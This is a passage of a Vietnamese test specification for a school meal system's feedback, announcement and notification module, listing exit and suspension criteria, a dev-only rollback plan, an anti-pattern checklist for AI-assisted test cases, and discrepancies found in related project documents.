- [ ] **Danh mục `audienceCodes` đã chốt cùng Minh** (L12) — hiện màn create và màn edit của mock dùng hai tập khác nhau
- [ ] 🔴 **`M10-D06`: `MealServingPort` ĐÃ GỠ.** MF09 đã merge (`V16`/`V17`) ⇒ `referenceResolver.servedAtOf()` là hàng thật, **không** stub contract. Mục dưới đây giữ lại làm lịch sử: ~~`MealServingPort` (MF09 — **bắt buộc**, không có nó thì BR-139 không test được), `ParentChildPort` (MF03)
- [ ] Testcontainers + **Mailpit** chạy được trên máy dev và CI (BR-159 — `MF10-TC-INT-018`)
- [ ] ⚠️ **Không chờ FE:** 6 blocker của `review.md` §H là việc của Minh (T3.3 dòng 187), nhưng test backend **không** phụ thuộc FE — chúng gọi API trực tiếp. Đây chính là cách chứng minh gate BR-139/BR-140/BR-142/BR-145 chạy ở **server**, không phải ở client

### Exit Criteria (Điều kiện kết thúc — DoD)

- [ ] `./mvnw test` — **toàn bộ unit test xanh**, không `@Disabled` (trừ `MF10-TC-SEC-010` chờ D8 và 1 case của `TC-005` chờ F6)
- [ ] `./mvnw verify -Pintegration` — **toàn bộ integration test xanh** với Testcontainers PostgreSQL 16 + Mailpit
- [ ] **Coverage ≥ 80% line** cho 3 package `com.sfms.{feedback,announcement,notification}` (JaCoCo)
- [ ] **15/15 UC** của traceability §1.10 có ≥1 test case (bảng TDS-03b phủ hết)
- [ ] **11/11 BR** có test — không BR nào chỉ được "phủ gián tiếp" *(khác MF08: MF10 không có BR nào nằm ngoài tầm kiểm của backend)*
- [ ] **6/6 blocker** của `review.md` §H có test khóa chặn: H1→`TC-019` · H2→`TC-008`/`TC-INT-007` · H3→`TC-006` · H4→`TC-001`/`TC-INT-015` · H5→`TC-018` · H6→`TC-020` · H7→`TC-024`/`TC-SEC-004`
- [ ] **Không giá trị enum cũ** nào còn trong `src/main` lẫn `src/test`:
  ```bash
  grep -rnE '"(ALLERGY|FOOD_SAFETY|NEWS|SYSTEM)"' src/main/java/com/sfms/mf10/ src/test/java/com/sfms/mf10/   # Expected: no output (L2/D6/M10-D07)
  grep -rn "Bữa trưa\|Bữa sáng\|Bữa phụ" src/main/java/com/sfms/mf10/                                        # Expected: no output (L4/D6/M10-D09)
  grep -rn "Medical Staff\|School Administration" src/main/java/com/sfms/mf10/                                # Expected: no output (L3/D6/M10-D08)
  grep -rn "REFERENCES users(" src/main/resources/db/migration/V18*.sql                                        # Expected: no output (C2/M10-D04)
  grep -rn "com.sfms.feedback\|com.sfms.announcement\|com.sfms.notification" src/                             # Expected: no output (M10-D03)
  ```
- [ ] **Không rò PII**: chạy `MF10-TC-008` + `TC-SEC-005` + `TC-INT-007` và lưu output làm bằng chứng cho **DPO Sign-off**
- [ ] Đối chiếu Swagger: 17 endpoint §9.1 chạy được, JSON khớp hợp đồng mock ở những field **không** bị D1–D10 ghi đè (Minh xác nhận — Team Plan §7)
- [ ] `NotificationPort` đã được ≥1 module khác (MF05 hoặc MF11) gọi thật — chứng minh ADR-M10-4 dùng được, không chỉ đúng trên giấy

**Exit Criteria bổ sung — CASE 2.0:**

- [ ] **Red Gate (§5.1)** — mọi test FAIL với stub trước khi implement; evidence log đính kèm; **4 loại PASS giả** đã được kiểm riêng (đặc biệt nhóm "field KHÔNG có mặt" — lớn nhất ở module này)
- [ ] **Contract Existence** — mọi import trong test resolve:
  ```bash
  ./mvnw -q test-compile        # Expected: BUILD SUCCESS, không "cannot find symbol"
  ```
- [ ] **Props Isolation** — không shared mutable state:
  ```bash
  grep -rnE "^\s*private (final|static) (Feedback|Announcement|UserNotification) " src/test/java/com/sfms/
  # Expected: no output
  ```
- [ ] **Oracle Source** — 52/52 test case có trường `Oracle Source` trỏ BR/UC/MSG/D-decision cụ thể

**Exit Criteria bổ sung — D1–D10 (`00_Common_Conventions.md` §Checklist):**

- [ ] D1: `MF10-TC-INT-009` xanh — không UUID nào lộ ra JSON/path param
- [ ] D2: `MF10-TC-INT-010` xanh — envelope 3 field, `details` không null
- [ ] D3: mọi URL test dùng `/api/v1`
- [ ] D4: `MF10-TC-021` xanh — không còn `dd/MM/yyyy`, `submittedAt` do server đặt
- [ ] D5: `MF10-TC-INT-011` xanh — client-supplied id hoạt động cả 3 nhánh
- [ ] D6: `MF10-TC-018` + `TC-019` + `TC-020` xanh — 3 enum lấy từ `common/enums`
- [ ] D7: `MF10-TC-INT-010` xanh — message tiếng Anh
- [ ] D9: `MF10-TC-INT-017` xanh — `created_by` do `AuditorAware` điền
- [ ] D10: `MF10-TC-SEC-009` xanh — upload đi qua `StorageService`
- [ ] *(D8 — chỉ khi Nam approve)* `MF10-TC-SEC-010` bỏ `@Disabled` → xanh

### Suspension Criteria (Điều kiện tạm dừng)

- **`common/enums/{NotificationType, MealType, RoleKey}` chưa có** (D6) — tạm dừng `TC-018`, `TC-019`, `TC-020`; **không** tự khai enum trong module để test xanh
- ~~**`MealServingPort` (MF09) chưa có contract**~~ 🔴 **KHÔNG CÒN LÀ ĐIỀU KIỆN TẠM DỪNG (03/08, `M10-D06`)** — MF09 đã merge `V16`/`V17`, `student_distributions.served_at` có thật. — BR-139 là luật trung tâm của module; chạy `TC-001`/`TC-002`/`TC-INT-002` ở mức **stub contract**, đánh dấu phần cross-module cho Phase 4 (`review_fix_plan.md`), **không** thay bằng `mealDate` client gửi
- **`common/storage/StorageService` / `BaseEntity` chưa có** (D9/D10) — tạm dừng `TC-SEC-009`, `TC-INT-017`
- **TDS chưa bổ sung `feedback_attachments`** (L8/F2) — `TC-SEC-009` giữ 🔴
- **Danh mục `audienceCodes` chưa chốt với Minh** (L12) — `TC-024`, `TC-SEC-004` chạy với danh mục tạm **và ghi rõ trong test**, không coi là đã xong
- **Mailpit không chạy trên CI** — tạm dừng nhánh email của `TC-INT-018`, giữ nhánh retry/deferred
- Docker/Testcontainers không chạy — tạm dừng toàn bộ nhóm `IT`, giữ nguyên nhóm unit
- Phát hiện mâu thuẫn mới giữa `00_Common_Conventions.md` và TDS → dừng, bổ sung vào §2 (Logic Issues) trước khi viết tiếp, **không** tự quyết

---

## 7. Rollback Plan

> ⚠️ Template gốc dùng `npx prisma migrate reset` — **sai stack**. MF10 dùng **Flyway + Maven** (Team Plan §2c-2, `01_MVP_Backend_Implementation_Plan.md` §3).

```bash
# 1. Hoàn tác migration MF10 (dev only — KHÔNG chạy trên production)
./mvnw -pl app flyway:undo
#    hoặc, nếu undo không khả dụng (Flyway Community):
psql -h localhost -U sfms -d sfms -f backup_20260802.sql

# 2. Testcontainers không cần dọn — container bị hủy sau mỗi lần chạy suite

# 3. Hoàn tác code
git checkout -- src/main/java/com/sfms/mf10/ src/test/java/com/sfms/mf10/   # M10-D03
git checkout -- src/main/resources/db/migration/V*__mf10_*.sql

# 4. Xác minh DB sạch
psql -h localhost -U sfms -d sfms -c "\dt feedback* announcement* notification*"
# Expected: không còn 9 bảng MF10
```

**Không rollback được (ghi rõ để không hứa sai):**
- **Thông báo đã công bố** (`status=PUBLISHED`, BR-138) — đã đẩy push/email tới hàng nghìn phụ huynh; rollback DB **không** thu hồi được nội dung đã hiển thị trên máy người dùng. Đây là lý do §6.5 TDS cấm `PUBLISHED → DRAFT`: sửa sai bằng **thông báo đính chính**, không bằng rollback
- **Email dự phòng đã gửi** (BR-159) — đã rời khỏi hệ thống
- **Cảnh báo y tế đã phát** (MSG-058) — Medical Staff có thể đã mở điều tra (MF11) dựa trên nó; xóa bản ghi phản hồi làm **đứt đầu mối** của sự cố đang mở

> ⚠️ **Không rollback bằng cách xóa `announcement_revisions`** — là hồ sơ tuân thủ BR-144 (bảng có RULE chặn DELETE, đúng ý đồ). Trước khi DROP bảng, **export ra file**: `\copy announcement_revisions TO 'revisions_backup.csv' CSV HEADER`.
> ⚠️ **Không xóa cứng `feedbacks`** — §4.2 TDS quy định soft delete vì dữ liệu có thể là đầu mối điều tra (BR-142).

**Sau rollback:** giữ nguyên trạng thái 🔴 của các TC trong §5; ghi lý do vào §CHANGELOG, **không** xóa dòng cũ (Policy 4.4).

---

## 8. CASE 2.0 Anti-Pattern Detection (AI-Assisted TCs)

> Test case trong tài liệu này **có AI hỗ trợ** (§1.1) → checklist dưới đây **bắt buộc** cho reviewer (Thảo — Lead Test/QA).

| AP-ID | Anti-Pattern | Dấu hiệu trong TDD spec | Check | Gate chặn |
|-------|-------------|--------------------------|-------|-----------|
| AP-AI-001 | Unconstrained Generation | TC không reference BR/UC/MSG/D-decision nào ở `Oracle Source`. ⚠️ **Rủi ro cao ở MF10** vì module không có `semantic-audit.ts` lẫn căn cứ pháp lý chuyên ngành — mọi oracle đứng trên 11 BR | ☐ | G-0 |
| AP-AI-002 | Green-from-Birth | Test PASS với stub `throw` (§5.1) — **rủi ro cao nhất ở nhóm "field KHÔNG có mặt"** (`TC-008`, `TC-SEC-005`, `TC-INT-007`, `TC-INT-015`) và nhóm "không bị chặn" (`TC-004`, `TC-023`): xem 4 loại PASS giả | ☐ | G-2 ★ |
| AP-AI-003 | Implicit Decision | Test giả định quyết định không có trong TDS §3 / `00_Common_Conventions.md` — vd **tự bịa ánh xạ 7 loại notification → 4 màu badge** (chưa ai định nghĩa — F1), hoặc **tự chọn ngữ nghĩa `"sốt cà chua"`** (F6) | ☐ | G-1 |
| AP-AI-004 | Layer Violation | Test kiểm business logic ở controller thay vì service (vd đặt ngoại lệ BR-142 ở controller — xem `TC-009`) | ☐ | G-4 |
| AP-AI-005 | Hallucinated Contract | Test import class/method không tồn tại (~~`MealServingPort`~~ → `ReferenceResolver.servedAtOf()` (`M10-D06`), ~~`ParentChildPort`~~ → `ReferenceResolver.isParentLinkedToStudent()`, `NotificationPort`, `StorageService` phải khớp TDS §8) | ☐ | G-3 |
| **AP-AI-011** | **Revived 4-value taxonomy** *(riêng MF10)* | Bất kỳ chuỗi `"ALLERGY"`, `"FOOD_SAFETY"`, `"NEWS"`, `"SYSTEM"` gắn với `NotificationType`, hoặc cột `critical` trong migration | ☐ | G-1 |
| **AP-AI-012** | **Hardcoded illness keywords** *(riêng MF10)* | `List.of("đau bụng", …)` trong `src/main` — vi phạm ADR-M10-6/C5 | ☐ | G-1 |
| **AP-AI-013** | **Client-trusted flag** *(riêng MF10)* | Service đọc `illnessKeyword`, `submittedAt`, `critical`, `revisedBy` từ request body thay vì tự tính / lấy từ JWT (L9, L14, `TC-011`) | ☐ | G-1 |

**Kết quả review:**

- [ ] Không phát hiện anti-pattern nào → TDD spec approved
- [ ] Phát hiện AP → ghi vào bảng dưới → fix trước khi implement

| AP detected | TC ID | Mô tả | Fix action | Fixed? |
|------------|-------|-------|------------|--------|
| `AP-AI-___` | `TC-___` | | | ☐ |

### 8.1 ⚠️ Việc cần sửa ở tài liệu khác (phát hiện khi viết TestSpec này)

> Đây **không** phải anti-pattern của test, mà là lệch ở nguồn — ghi ra để chủ sở hữu tài liệu xử lý, **không** tự sửa file của người khác.

| # | Phát hiện | Ảnh hưởng | Ai xử lý |
|---|-----------|-----------|----------|
| **F1** ✅🟡 | ✅ **VẾ TDS ĐÃ ĐÓNG 2026-08-03 (`M10-D07`)** — §5.2 nay import `common/enums/NotificationType` (7 giá trị) và **bỏ cột `critical`** (dẫn xuất). 🟡 **Vế ánh xạ badge VẪN TREO** — việc của Minh. Nội dung gốc: **TDS-MF10 §5.2/§9.2 còn `NotificationType` 4 giá trị + cột `critical`** — đã bị **D6 ghi đè thành 7 giá trị** (L2). Kèm theo: **ánh xạ 7 loại → 4 màu badge** của `notification-bell.tsx` (`ALLERGY/FOOD_SAFETY` = đỏ · `NEWS` = vàng · `SYSTEM` = xám) **chưa ai định nghĩa** ở đâu | Không sửa TDS thì người implement code theo TDS và `TC-018` đỏ vĩnh viễn. Không chốt ánh xạ badge thì FE tự đoán màu cho `CAPA_ASSIGNED`/`EXPIRY_ALERT`/`MENU_PUBLISHED` | **Mạnh** sửa TDS §5.2/§9.2 · **Minh** chốt ánh xạ ở `lib/labels.ts` (D6) |
| **F2** ✅ | ✅ **ĐÃ ĐÓNG 2026-08-03 (`M10-D11`)** — TDS §5.2 thêm bảng `feedback_attachments`, §9.1/§9.2 thêm 2 endpoint (upload multipart qua `StorageService`, tải xuống có `@PreAuthorize` + audit), §10 thêm `FBA-MEDIA`/`FBA-SIZE`. `MF10-TC-SEC-009` nay **có contract để test** (xem `L19`). Vế FE (`useCreate` cho file) vẫn là việc của Minh. Nội dung gốc: **TDS-MF10 thiếu hẳn luồng đính kèm file** dù **D10 nêu đích danh "MF10 ảnh đính kèm phản ánh"** và mock có ô chọn file (`parent/feedback/quality/page.tsx` — `fileName` + `Paperclip`) mà **file không đi đâu cả** | `MF10-TC-SEC-009` không có contract để test. Chức năng nửa vời ở **cả hai phía**: FE cho chọn file, BE không có chỗ nhận | **Mạnh** bổ sung `feedback_attachments` + endpoint vào TDS §5.2/§9 (kèm câu bắt buộc của D10) · **Minh** nối `useCreate` cho file |
| **F3** | **UC file MF10 dùng MSG-071/072/074 cho announcement** — ba mã này thuộc module **Menu** trong `error_message.md` §4 (*"Menu draft was saved"*, *"Special meal plan saved"*, *"Menu updated"*). Mock cũng toast MSG-074 (`[id]/edit/page.tsx:73`) và ghi audit `(BR-144, MSG-074)` (`mock-server.ts:176`) | TestSpec **không** dùng ba mã này (theo traceability: MSG-047/MSG-029). Nhưng trạng thái **"lưu nháp thành công" hiện không có MSG nào** → `TC-013` không assert được mã thông điệp | **Huy** quyết định: cấp MSG mới cho "Announcement draft saved" hay chấp nhận không có · **Minh** sửa toast/audit của mock |
| **F4** | **Team Plan §2b-5 ghi `SEARCH_FIELDS` của MF10 là `title, senderName, content`** — **cả 3 field không tồn tại** trên entity `Feedback` (mock lẫn `data_model.puml` chỉ có `student`, `class`, `dish`, `comment`, `tags`) | Ai đọc kế hoạch mà không đọc TDS CF-M10-8 sẽ implement search trên field không có → **luôn trả rỗng, không báo lỗi**. `TC-022` bước 3 khóa chặn | **Nam** (chủ Team Plan) sửa bảng §2b-5 theo TDS: `comment, dish_name, class_name` |
| **F5** | **Hai ngưỡng không có BR đứng sau:** (a) **48 giờ** "trả lời trễ" chỉ xuất hiện ở **UC-163 EX2**, không có BR; (b) **BR-141 nằm ở cột BR của UC-046** (Manage Meal Feedback) trong traceability §1.10 nhưng nội dung BR-141 là *"biên soạn biểu đồ tổng hợp hàng tuần"* — không liên quan việc phụ huynh quản lý phản hồi của mình | (a) `TC-023` dùng UC làm oracle (hợp lệ theo Team Plan §2a) nhưng nếu sau này cần đổi ngưỡng thì không có BR để sửa. (b) `TC-INT-007` phủ BR-141 ở UC-164, **không** nhân đôi ở UC-046 — cần Huy xác nhận là đúng ý | **Huy** (Lead Traceability) |
| **F6** | **BR-142 không định nghĩa ngữ cảnh từ khóa.** `"sốt"` là 1 trong 10 từ khóa; câu *"món có sốt cà chua"* sẽ khớp. Không nguồn nào nói nên chấp nhận dương tính giả hay lọc theo ngữ cảnh | 1 case của `MF10-TC-005` để **⏸️ `@Disabled`** cho tới khi có quyết định — nếu tự chọn là **AP-AI-003**. Ảnh hưởng thật: Y tế nhận cảnh báo rác sẽ dần bỏ qua cả cảnh báo thật | **Huy** + **Thảo** (hỏi Y tế trường nếu cần) |
| **F7** | **`semantic-audit.ts` có 0/54 luật chạm MF10** — trong khi MF05/MF07/MF08/MF09/MF11 đều có. Nghĩa là module chạm PII nhiều nhất lại **không có lưới an toàn thứ hai** ở tầng dữ liệu | `MF10-TC-INT-016` dựng 8 invariant thay thế (nguồn = BR). Nhưng script `npm run audit:data` của Thảo vẫn **không** kiểm gì cho MF10 — dữ liệu seed sai BR-140/BR-142 sẽ không bị bắt ở tầng mock | **Thảo** (Lead Test) cân nhắc bổ sung ≥2 luật cho MF10 vào `semantic-audit.ts` (gợi ý: `PHAN_HOI_DUOI_3_SAO_KHONG_TAG`, `TU_KHOA_BENH_LY_KHONG_CO_CANH_BAO`) |
| **F8** | **`review.md` §H10 ghi 5 endpoint MF10 "chưa có màn"** (UC-046 AF1/AF2, UC-163, UC-164, BR-139 eligible-meals) và xếp **minor "backlog FE"** | Không chặn test backend (đã ghi ở Entry Criteria), nhưng nếu backlog này không vào sprint thì **UC-163 (BR-143) và UC-164 (BR-141/145) không demo được** — hai UC có test đầy đủ mà người dùng không chạm tới được | **Minh** đưa 5 màn vào kế hoạch sprint (`review_fix_plan.md` T3.3) |
| **F9** | **Kế hoạch §3 ghi MF10 = "7 UC"** trong khi traceability §1.10 có **15**, UC file có **11** | Ước lượng công sức của module bị đánh giá thấp hơn thực tế **hơn gấp đôi** — MF10 xếp P2 (làm nửa sau) nhưng khối lượng ngang một module P1. Ngoài ra `NotificationPort` là hạ tầng cho 4 module khác nên **không thể** để cuối | **Nam** cân nhắc lại thứ tự trong Team Plan §3 / lịch §4b |

---

*TDD Spec v1.0 cho MF10 — tuân thủ `PHASE-4_Test-Spec.md` (ISO/IEC/IEEE 29119-3:2021) + CASE 2.0 Red Gate & Anti-Pattern Detection.*
*Ví dụ code viết bằng **Java 25 / JUnit 5 / Testcontainers / Flyway** — đã dịch từ mẫu TypeScript/Prisma của template theo ràng buộc stack `00_Team_Work_Assignment_Plan.md` §2c-2.*
*Oracle của mọi test case trỏ **BR / UC / MSG / quyết định D1–D10** — không dùng giả định AI (Team Plan §2a). Module này **không** có luật `semantic-audit.ts` nào, nên §TDS-03b và §8.1 là chốt kiểm chính.*
